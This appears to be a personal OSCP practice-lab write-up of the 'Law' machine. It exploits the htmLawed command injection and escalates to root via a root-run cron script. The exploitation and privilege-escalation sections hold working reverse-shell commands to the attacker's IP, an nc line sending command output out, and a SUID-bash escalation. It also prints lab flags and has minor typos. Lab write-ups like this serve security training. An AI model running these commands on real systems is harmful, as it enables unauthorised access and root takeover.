---
title: OSCP - Law - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
Related: "[[Cybersecurity]]"
tags:
  - Cybersecurity
---
# Law
This one was another absolute slog. Identifying exploits for htmLawed v1.2.5 was very straightforward, and I got a little excited when I saw an RCE exploit had been found this year (2024). 

Running the exploit didn't work though, so I started researching the vulnerability further while trying to avoid the walkthroughs. I found the [Mayfly article on the CVE](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) which added a lot of extra context, and checking the walkthrough helped me realise why the Burpsuite request wasn't working properly (the request was to a non-existent page, and needed to be changed to `/`). 

Even with that though, it still look a remarkably long time to get the reverse shell setup - running BurpSuite `intercept` and modifying the request *BEFORE* it went to the target was the trick, rather than trying to use `repeater` to modify requests already sent.

With a dumb shell established, it was a surprise to lose it the moment I tried to use python to upgrade to a bash shell - going forward I might run `/usr/bin/script -qc /bin/bash /dev/null` first as it's more likely to give me the shell I'm after without breaking things.

PrivEsc turned out to be easier and more complicated than expected. Easier in that the `cleanup.sh` script was identified as interesting early on, but harder than expected when it came to testing the shell to see who was running it, and then how to modify it further when it came to switching to root - all of which I leaned on the walkthrough for. Adding the `curl` command was one step, but using `nc` to send the `id` to the listening port was very cool and clever. Changing the bash permissions was genius too, so definitely need to keep that set of commands handy for the next time there's a user script being run regularly by `root`.

# Resolution summary
- Ran Nmap to identify ports `22` & `80`
- Visited http (`80`) & identified htmLawed v1.2.5
- Researched vulnerability and attempted manual exploit
- Used Burpsuite to fix error with request and achieved reverse shell
- Identified script owned by `www-data` user but being regularly run by `root`
- Added command to change permissions to `/bin/bash`
- Used `bash -p` to switch to `root`
## Improved skills
- Burpsuite forwarding and request modification
- Identifying user scripts being regularly run by `root`
## Used tools
- nmap
- gobuster
- burpsuite
- python3

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Law.nmap 192.168.201.190 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: htmLawed (1.2.5) test
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.201.190:80` and identified `htmLawed v1.2.5`
![OSCP - Law - Linux - image1](/files/OSCP%20-%20Law%20-%20Linux%20-%20image1.png)
	- `htmLawed v1.2.5` is vulnerable to command injection [CVE-202-35914](https://nvd.nist.gov/vuln/detail/cve-2022-35914)
- Ran `gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt` to identify any web directories
![OSCP - Law - Linux - image2](/files/OSCP%20-%20Law%20-%20Linux%20-%20image2.png)
- Ran `gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt -x php,html,htm,txt` to identify any files
![OSCP - Law - Linux - image3](/files/OSCP%20-%20Law%20-%20Linux%20-%20image3.png)

---
# Exploitation
## Command Injection
- Found potential exploit `52023` on [ExploitDB](https://www.exploit-db.com/exploits/52023)
- Copied exploit and ran `./52023.sh -u http://192.168.201.190 -c id` for no output
![OSCP - Law - Linux - image4](/files/OSCP%20-%20Law%20-%20Linux%20-%20image4.png)
- [Further investigated vulnerability](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) and found it might be executed from the target website by changing `hook` in settings to `exec` with `id` to test command execution
![OSCP - Law - Linux - image5](/files/OSCP%20-%20Law%20-%20Linux%20-%20image5.png)
- Processed request and recieved `404 Not Found`
![OSCP - Law - Linux - image6](/files/OSCP%20-%20Law%20-%20Linux%20-%20image6.png)
- Checked `BurpSuite` proxy history and found request was going to `htmLawedTest.php`.
![OSCP - Law - Linux - image7](/files/OSCP%20-%20Law%20-%20Linux%20-%20image7.png)
- Sent request to `repeater` and modified POST request from `/htmLawedTest.php` to `/` then resent request with `id` and hook set to `exec`
![OSCP - Law - Linux - image8](/files/OSCP%20-%20Law%20-%20Linux%20-%20image8.png)
- Ran `nc -nvlp 4444` to setup Netcat listener, then replaced `id` with `/bin/sh -i >& /dev/tcp/192.168.45.215/4444 0>&1` to attempt reverse shell
![OSCP - Law - Linux - image9](/files/OSCP%20-%20Law%20-%20Linux%20-%20image9.png)
- Reattempted with `nc 192.168.45.215 4444 -e /bin/sh` and successfully caught reverse shell for initial access
![OSCP - Law - Linux - image10](/files/OSCP%20-%20Law%20-%20Linux%20-%20image10.png)
---
# Lateral Movement to user
## Local Enumeration
- Attempted to use `python3` to upgrade shell but broke reverse shell and had to restart netcat listener
![OSCP - Law - Linux - image11](/files/OSCP%20-%20Law%20-%20Linux%20-%20image11.png)
- Repeated earlier steps to restablish initial access, then checked for python to find it's not installed. Ran `/usr/bin/script -qc /bin/bash /dev/null` instead to achieve full shell, then navigated to home directory of `www-data` user to print `local.txt`
![OSCP - Law - Linux - image12](/files/OSCP%20-%20Law%20-%20Linux%20-%20image12.png)
- Ran `find / -perm -u=s -type f 2>/dev/null -printf "%f\n"` to find binaries with potential SUID bit set
![OSCP - Law - Linux - image13](/files/OSCP%20-%20Law%20-%20Linux%20-%20image13.png)

---
# Privilege Escalation
## Local Enumeration
- Ran `cat /etc/passwd` to identify any other users
![OSCP - Law - Linux - image14](/files/OSCP%20-%20Law%20-%20Linux%20-%20image14.png)
- Uploaded and ran `suider.sh` to find potential SUID exploits
![OSCP - Law - Linux - image15](/files/OSCP%20-%20Law%20-%20Linux%20-%20image15.png)
- Uploaded and ran `linpeas.sh` to find potential Privilege Escalations
![OSCP - Law - Linux - image16](/files/OSCP%20-%20Law%20-%20Linux%20-%20image16.png)
- Found `cleanup.sh` in `www-data` home directory
![OSCP - Law - Linux - image17](/files/OSCP%20-%20Law%20-%20Linux%20-%20image17.png)
- Ran `cat /var/www/cleanup.sh` to view `cleanup.sh`
![OSCP - Law - Linux - image18](/files/OSCP%20-%20Law%20-%20Linux%20-%20image18.png)
## Privilege Escalation vector
- Ran `nc -nvlp 8081` to setup netcat listener on 8081, then ran `echo 'id | nc 192.168.45.215 8081' >> cleanup.sh` to identify `cleanup.sh` is being regularly executed by `root`
![OSCP - Law - Linux - image19](/files/OSCP%20-%20Law%20-%20Linux%20-%20image19.png)
- Ran `echo "chmod +s /bin/bash" >> cleanup.sh` to use `root` to change `/bin/bash` permissions, and ran `bash -p` until `cleanup.sh` was executed by `root` and user switched to `root`
![OSCP - Law - Linux - image20](/files/OSCP%20-%20Law%20-%20Linux%20-%20image20.png)
- Ran `cat /root/proof.txt` to print `proof.txt` flag
![OSCP - Law - Linux - image21](/files/OSCP%20-%20Law%20-%20Linux%20-%20image21.png)
---
# Trophy & Loot
`local.txt` = `e4dc76bd63849b739fd9741f9bda6995`
`root.txt` = `b9d98ca2768e55aba770c7fb1f730323`

